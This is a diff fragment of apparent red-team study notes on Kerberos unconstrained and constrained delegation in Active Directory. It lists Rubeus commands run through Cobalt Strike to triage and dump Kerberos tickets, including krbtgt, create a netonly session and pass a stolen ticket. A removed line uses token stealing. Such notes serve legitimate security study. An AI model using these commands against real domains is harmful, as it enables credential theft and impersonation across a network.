@@ -23,11 +23,10 @@ Rubeus ptt /ticket:doIFXDCCBVi[…snip…]bDWN5YmVyYm90aWMuaW8=
 the server or the service account that is granted this right is able to impersonate a user to authenticate to any services on any host,you are granting that account permission to delegate to any service
 ```
 execute-assembly C:\Users\Public\Rubeus.exe triage
-execute-assembly C:\Users\Public\Rubeus.exe dump /luid:0x1c6be # krbtgt/insomnia.ninja along with LUID
-execute-assembly C:\Users\Public\Rubeus.exe dump /service:krbtgt
-execute-assembly C:\Users\Public\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe 
-execute-assembly C:\Users\Public\Rubeus.exe ptt /luid:0x21d8e17 /ticket:[...snip...]
-steal_token 4652
+execute-assembly C:\Users\Public\Rubeus.exe dump /luid:0x1c6be /nowrap
+execute-assembly C:\Users\Public\Rubeus.exe dump /service:krbtgt /nowrap
+execute-assembly C:\Users\Public\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe
+execute-assembly C:\Users\Public\Rubeus.exe ptt /ticket: /luid:0x239b995
 ```
 ### Constrained Delegation
 constrained delegation takes it a step further by allowing you to configure which services an account can be delegated to.it limits delegation to a specified list, rather than allowing delegation to any service as in unconstrained delegation.
